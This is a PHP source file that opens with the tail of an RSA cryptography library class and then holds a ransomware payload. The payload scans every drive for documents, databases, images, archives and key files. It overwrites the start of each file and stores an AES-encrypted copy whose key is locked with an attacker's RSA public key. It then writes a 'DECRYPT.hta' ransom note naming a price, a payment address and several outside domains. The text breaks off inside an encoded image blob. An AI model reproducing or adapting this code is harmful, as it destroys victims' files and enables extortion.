        $m = ltrim($m, chr(0));
        if (ord($m[0]) != 1) {
            user_error('Decryption error');
            return false;
        }
        return substr($m, 1);
    }
    function _raw_encrypt($m) {
        $temp = $this->_os2ip($m);
        $temp = $this->_rsaep($temp);
        return $this->_i2osp($temp, $this->k);
    }
    function _rsaes_pkcs1_v1_5_encrypt($m) {
        $mLen = strlen($m);
        if ($mLen > $this->k - 11) {
            user_error('Message too long');
            return false;
        }
        $psLen = $this->k - $mLen - 3;
        $ps = '';
        while (strlen($ps) != $psLen) {
            $temp = crypt_random_string($psLen - strlen($ps));
            $temp = str_replace("", '', $temp);
            $ps.= $temp;
        }
        $type = 2;
        if (defined('CRYPT_RSA_PKCS15_COMPAT') && (!isset($this->publicExponent) || $this->exponent !== $this->publicExponent)) {
            $type = 1;
            $ps = str_repeat("", $psLen);
        }
        $em = chr(0) . chr($type) . $ps . chr(0) . $m;
        $m = $this->_os2ip($em);
        $c = $this->_rsaep($m);
        $c = $this->_i2osp($c, $this->k);
        return $c;
    }
    function _rsaes_pkcs1_v1_5_decrypt($c) {
        if (strlen($c) != $this->k) {
            user_error('Decryption error');
            return false;
        }
        $c = $this->_os2ip($c);
        $m = $this->_rsadp($c);
        if ($m === false) {
            user_error('Decryption error');
            return false;
        }
        $em = $this->_i2osp($m, $this->k);
        if (ord($em[0]) != 0 || ord($em[1]) > 2) {
            user_error('Decryption error');
            return false;
        }
        $ps = substr($em, 2, strpos($em, chr(0), 2) - 2);
        $m = substr($em, strlen($ps) + 3);
        if (strlen($ps) < 8) {
            user_error('Decryption error');
            return false;
        }
        return $m;
    }
    function _emsa_pss_encode($m, $emBits) {
        $emLen = ($emBits + 1) >> 3;
        $sLen = $this->sLen !== null ? $this->sLen : $this->hLen;
        $mHash = $this->hash->hash($m);
        if ($emLen < $this->hLen + $sLen + 2) {
            user_error('Encoding error');
            return false;
        }
        $salt = crypt_random_string($sLen);
        $m2 = "" . $mHash . $salt;
        $h = $this->hash->hash($m2);
        $ps = str_repeat(chr(0), $emLen - $sLen - $this->hLen - 2);
        $db = $ps . chr(1) . $salt;
        $dbMask = $this->_mgf1($h, $emLen - $this->hLen - 1);
        $maskedDB = $db ^ $dbMask;
        $maskedDB[0] = ~ chr(0xFF << ($emBits & 7)) & $maskedDB[0];
        $em = $maskedDB . $h . chr(0xBC);
        return $em;
    }
    function _emsa_pss_verify($m, $em, $emBits) {
        $emLen = ($emBits + 1) >> 3;
        $sLen = $this->sLen !== null ? $this->sLen : $this->hLen;
        $mHash = $this->hash->hash($m);
        if ($emLen < $this->hLen + $sLen + 2) {
            return false;
        }
        if ($em[strlen($em) - 1] != chr(0xBC)) {
            return false;
        }
        $maskedDB = substr($em, 0, -$this->hLen - 1);
        $h = substr($em, -$this->hLen - 1, $this->hLen);
        $temp = chr(0xFF << ($emBits & 7));
        if ((~$maskedDB[0] & $temp) != $temp) {
            return false;
        }
        $dbMask = $this->_mgf1($h, $emLen - $this->hLen - 1);
        $db = $maskedDB ^ $dbMask;
        $db[0] = ~ chr(0xFF << ($emBits & 7)) & $db[0];
        $temp = $emLen - $this->hLen - $sLen - 2;
        if (substr($db, 0, $temp) != str_repeat(chr(0), $temp) || ord($db[$temp]) != 1) {
            return false;
        }
        $salt = substr($db, $temp + 1);
        $m2 = "" . $mHash . $salt;
        $h2 = $this->hash->hash($m2);
        return $this->_equals($h, $h2);
    }
    function _rsassa_pss_sign($m) {
        $em = $this->_emsa_pss_encode($m, 8 * $this->k - 1);
        $m = $this->_os2ip($em);
        $s = $this->_rsasp1($m);
        $s = $this->_i2osp($s, $this->k);
        return $s;
    }
    function _rsassa_pss_verify($m, $s) {
        if (strlen($s) != $this->k) {
            user_error('Invalid signature');
            return false;
        }
        $modBits = 8 * $this->k;
        $s2 = $this->_os2ip($s);
        $m2 = $this->_rsavp1($s2);
        if ($m2 === false) {
            user_error('Invalid signature');
            return false;
        }
        $em = $this->_i2osp($m2, $modBits >> 3);
        if ($em === false) {
            user_error('Invalid signature');
            return false;
        }
        return $this->_emsa_pss_verify($m, $em, $modBits - 1);
    }
    function _emsa_pkcs1_v1_5_encode($m, $emLen) {
        $h = $this->hash->hash($m);
        if ($h === false) {
            return false;
        }
        switch ($this->hashName) {
            case 'md2':
                $t = pack('H*', '3020300c06082a864886f70d020205000410');
            break;
            case 'md5':
                $t = pack('H*', '3020300c06082a864886f70d020505000410');
            break;
            case 'sha1':
                $t = pack('H*', '3021300906052b0e03021a05000414');
            break;
            case 'sha256':
                $t = pack('H*', '3031300d060960864801650304020105000420');
            break;
            case 'sha384':
                $t = pack('H*', '3041300d060960864801650304020205000430');
            break;
            case 'sha512':
                $t = pack('H*', '3051300d060960864801650304020305000440');
        }
        $t.= $h;
        $tLen = strlen($t);
        if ($emLen < $tLen + 11) {
            user_error('Intended encoded message length too short');
            return false;
        }
        $ps = str_repeat(chr(0xFF), $emLen - $tLen - 3);
        $em = "$ps$t";
        return $em;
    }
    function _rsassa_pkcs1_v1_5_sign($m) {
        $em = $this->_emsa_pkcs1_v1_5_encode($m, $this->k);
        if ($em === false) {
            user_error('RSA modulus too short');
            return false;
        }
        $m = $this->_os2ip($em);
        $s = $this->_rsasp1($m);
        $s = $this->_i2osp($s, $this->k);
        return $s;
    }
    function _rsassa_pkcs1_v1_5_verify($m, $s) {
        if (strlen($s) != $this->k) {
            user_error('Invalid signature');
            return false;
        }
        $s = $this->_os2ip($s);
        $m2 = $this->_rsavp1($s);
        if ($m2 === false) {
            user_error('Invalid signature');
            return false;
        }
        $em = $this->_i2osp($m2, $this->k);
        if ($em === false) {
            user_error('Invalid signature');
            return false;
        }
        $em2 = $this->_emsa_pkcs1_v1_5_encode($m, $this->k);
        if ($em2 === false) {
            user_error('RSA modulus too short');
            return false;
        }
        return $this->_equals($em, $em2);
    }
    function setEncryptionMode($mode) {
        $this->encryptionMode = $mode;
    }
    function setSignatureMode($mode) {
        $this->signatureMode = $mode;
    }
    function setComment($comment) {
        $this->comment = $comment;
    }
    function getComment() {
        return $this->comment;
    }
    function encrypt($plaintext) {
        switch ($this->encryptionMode) {
            case CRYPT_RSA_ENCRYPTION_NONE:
                $plaintext = str_split($plaintext, $this->k);
                $ciphertext = '';
                foreach ($plaintext as $m) {
                    $ciphertext.= $this->_raw_encrypt($m);
                }
                return $ciphertext;
            case CRYPT_RSA_ENCRYPTION_PKCS1:
                $length = $this->k - 11;
                if ($length <= 0) {
                    return false;
                }
                $plaintext = str_split($plaintext, $length);
                $ciphertext = '';
                foreach ($plaintext as $m) {
                    $ciphertext.= $this->_rsaes_pkcs1_v1_5_encrypt($m);
                }
                return $ciphertext;
            default:
                $length = $this->k - 2 * $this->hLen - 2;
                if ($length <= 0) {
                    return false;
                }
                $plaintext = str_split($plaintext, $length);
                $ciphertext = '';
                foreach ($plaintext as $m) {
                    $ciphertext.= $this->_rsaes_oaep_encrypt($m);
                }
                return $ciphertext;
        }
    }
    function decrypt($ciphertext) {
        if ($this->k <= 0) {
            return false;
        }
        $ciphertext = str_split($ciphertext, $this->k);
        $ciphertext[count($ciphertext) - 1] = str_pad($ciphertext[count($ciphertext) - 1], $this->k, chr(0), STR_PAD_LEFT);
        $plaintext = '';
        switch ($this->encryptionMode) {
            case CRYPT_RSA_ENCRYPTION_NONE:
                $decrypt = '_raw_encrypt';
            break;
            case CRYPT_RSA_ENCRYPTION_PKCS1:
                $decrypt = '_rsaes_pkcs1_v1_5_decrypt';
            break;
            default:
                $decrypt = '_rsaes_oaep_decrypt';
        }
        foreach ($ciphertext as $c) {
            $temp = $this->$decrypt($c);
            if ($temp === false) {
                return false;
            }
            $plaintext.= $temp;
        }
        return $plaintext;
    }
    function sign($message) {
        if (empty($this->modulus) || empty($this->exponent)) {
            return false;
        }
        switch ($this->signatureMode) {
            case CRYPT_RSA_SIGNATURE_PKCS1:
                return $this->_rsassa_pkcs1_v1_5_sign($message);
            default:
                return $this->_rsassa_pss_sign($message);
        }
    }
    function verify($message, $signature) {
        if (empty($this->modulus) || empty($this->exponent)) {
            return false;
        }
        switch ($this->signatureMode) {
            case CRYPT_RSA_SIGNATURE_PKCS1:
                return $this->_rsassa_pkcs1_v1_5_verify($message, $signature);
            default:
                return $this->_rsassa_pss_verify($message, $signature);
        }
    }
    function _extractBER($str) {
        $temp = preg_replace('#.*?^-+[^-]+-+[
 ]*$#ms', '', $str, 1);
        $temp = preg_replace('#-+[^-]+-+#', '', $temp);
        $temp = str_replace(array("
", "
", ' '), '', $temp);
        $temp = preg_match('#^[a-zA-Z\d/+]*={0,2}$#', $temp) ? base64_decode($temp) : false;
        return $temp != false ? $temp : $str;
    }
} $lands = array("www.mecanique-de-precision.net", "musaler.ru", "4southern.com", "vinoteka28.ru", "osadakrajenska.pl");
$address = $_SERVER["argv"][1];
$price = $_SERVER["argv"][2];
$keypub = $_SERVER["argv"][3];
$cs = chr(92);
$cq = chr(34);
$fn = substr($_SERVER["argv"][0], 0, -4);
function Tree($p) {
    $s = chr(92);
    if (preg_match("/" . $s . $s . "(winnt|boot|system|windows|tmp|temp|program|appdata|application|roaming|msoffice|temporary|cache)/i", $p) || preg_match("/recycle/i", $p)) return;
    $dp = opendir($p);
    if ($dp === false) return;
    while ($o = readdir($dp)) if ($o != "." && $o != "..") {
        if (!is_writable($p . $s . $o)) chmod($p . $s . $o, 0777);
        if (is_dir($p . $s . $o)) {
            Tree($p . $s . $o);
        } elseif (preg_match("/[.](123|602|dif|docb|docm|dot|dotm|dotx|hwp|mml|odg|odp|ods|otg|otp|ots|ott|pot|potm|potx|ppam|ppsm|ppsx|pptm|sldm|sldx|slk|stc|std|sti|stw|sxc|sxd|sxm|sxw|txt|uop|uot|wb2|wk1|wks|xlc|xlm|xlsb|xlsm|xlt|xltm|xltx|xlw|xml|asp|bat|brd|c|cmd|dch|dip|jar|js|rb|sch|sh|vbs|3g2|fla|m4u|swf|bmp|cgm|djv|gif|nef|png|db|dbf|frm|ibd|ldf|myd|myi|onenotec2|sqlite3|sqlitedb|paq|tbk|tgz|3dm|asc|lay|lay6|ms11|ms11|crt|csr|key|p12|pem|qcow2|vmx|aes|zip|rar|r00|r01|r02|r03|7z|tar|gz|gzip|arc|arj|bz|bz2|bza|bzip|bzip2|ice|xls|xlsx|doc|docx|pdf|djvu|fb2|rtf|ppt|pptx|pps|sxi|odm|odt|mpp|ssh|pub|gpg|pgp|kdb|kdbx|als|aup|cpr|npr|cpp|bas|asm|cs|php|pas|class|py|pl|h|vb|vcproj|vbproj|java|bak|backup|mdb|accdb|mdf|odb|wdb|csv|tsv|sql|psd|eps|cdr|cpt|indd|dwg|ai|svg|max|skp|scad|cad|3ds|blend|lwo|lws|mb|slddrw|sldasm|sldprt|u3d|jpg|jpeg|tiff|tif|raw|avi|mpg|mp4|m4v|mpeg|mpe|wmf|wmv|veg|mov|3gp|flv|mkv|vob|rm|mp3|wav|asf|wma|m3u|midi|ogg|mid|vdi|vmdk|vhd|dsk|img|iso)$/i", $o)) {
            $_SERVER["files"][] = $p . $s . $o;
        }
    }
    closedir($dp);
}
$_SERVER["files"] = array();
$stat_drives = "";
for ($i = 67;$i <= 90;$i++) {
    if (is_dir(chr($i) . ":")) {
        $stat_drives.= chr($i);
        Tree(chr($i) . ":");
    }
}
$stat_files = count($_SERVER["files"]);
if ($stat_files > 0) {
    $db = fopen($fn . ".db", "w");
    foreach ($_SERVER["files"] as $file) {
        $fp = fopen($file, "r+");
        if ($fp === false) continue;
        $trash = "";
        for ($i = 0;$i < 2048;$i++) $trash.= chr(mt_rand(0, 255));
        $key = "";
        for ($i = 0;$i < 128;$i++) $key.= chr(mt_rand(0, 255));
        $aes = new Crypt_AES(CRYPT_AES_MODE_ECB);
        $aes->setKeyLength(128);
        $aes->setKey($key);
        $b = fread($fp, 2048);
        fseek($fp, 0);
        fwrite($fp, substr($trash, 0, strlen($b)));
        fclose($fp);
        $b = $aes->encrypt($b);
        $rsa = new Crypt_RSA();
        $rsa->loadKey($keypub);
        $key = $rsa->encrypt($key);
        fputs($db, $file . "	" . base64_encode($key) . "	" . base64_encode($b) . "
");
    }
    fclose($db);
    $hta = gzinflate(base64_decode("hVTBbtpAED0TKf8wtURPCU6iHiJqLDnYUlAJILAa5VSt7SFeZdlxd9ci9Os7XkBJVZScbM++nffm7fNG9/nDND4/i+6zJPXPPBkmi8V0Mk7yyXwGk3QUpNl4+bTIA3i3MEsesncrj5NZOn9c5UnO1Y14lRv5BwMIu5b5JJ9m8QEahftProdHzrt5+gTFc0mKzCgwWAXg8NWNgm0tHXexbqdwFKxJu8u12Ei1G8JPNJXQIuD952e9qL7+B2WZfQg3t81rECd5ns06yV+isL4+4JtT8CsPVwp21BqoqGw3qJ29gKYmR/yshBOFsGhB6ArI1WhAbhoyTmgHDRpLWihYS8WQLRoE1KXZNQ6rqDBxa6V+BgElbQqphZOkgdasxBDXl6vk8ubq263vnWSry+sbflfPZKSrN3YQhQ2L732sPq8RSKsdbMUOHIFB64h1+In2uqTtFop2BxV6cWQGsFDIc13AmpSiLfBkFpkEGzvc83a0pDoBvUjJeGxQuEPbO+lKkpoplUIHbAoOPa5QVL78bslhXDvHrcLQl8paSD2Qek3hfk+ocRuF7+B+e8g8ntgz3rHgqL9YTsZZP4Ziz2k/ZuOKUEfogG0Peexfx8JnjCvkgzhBye65ml0UVcX22v/Yo36SpststerHn1HMG+QIaOxiwJ4f7O9SoqR+4bPSe4sLQ1uL5gTVdDL78QFRr3ekSmmrFYnKx8u0+u30T+dkcOwQhf7cfe7ir7qwzfdDFPn7iVooheYt3NW7wg4505Y+3Cz/7YrouvKsh58L7Yuj5hDqKOyugP2d0N1HfwE="));
    $links = "";
    foreach ($lands as $land) $links.= "<div>http://" . $land . "/counter/?" . $address . "</div>";
    $hta = str_replace("<%PRICE%>", $price, $hta);
    $hta = str_replace("<%ADDRESS%>", $address, $hta);
    $hta = str_replace("<%LINKS%>", $links, $hta);
    $fp = fopen($fn . ".hta", "w");
    fputs($fp, $hta);
    fclose($fp);
    $fp = fopen($_ENV["APPDATA"] . $cs . "Desktop" . $cs . "DECRYPT.hta", "w");
    fputs($fp, $hta);
    fclose($fp);
    $fp = fopen($_ENV["USERPROFILE"] . $cs . "Desktop" . $cs . "DECRYPT.hta", "w");
    fputs($fp, $hta);
    fclose($fp);
    $bmp = gzinflate(base64_decode("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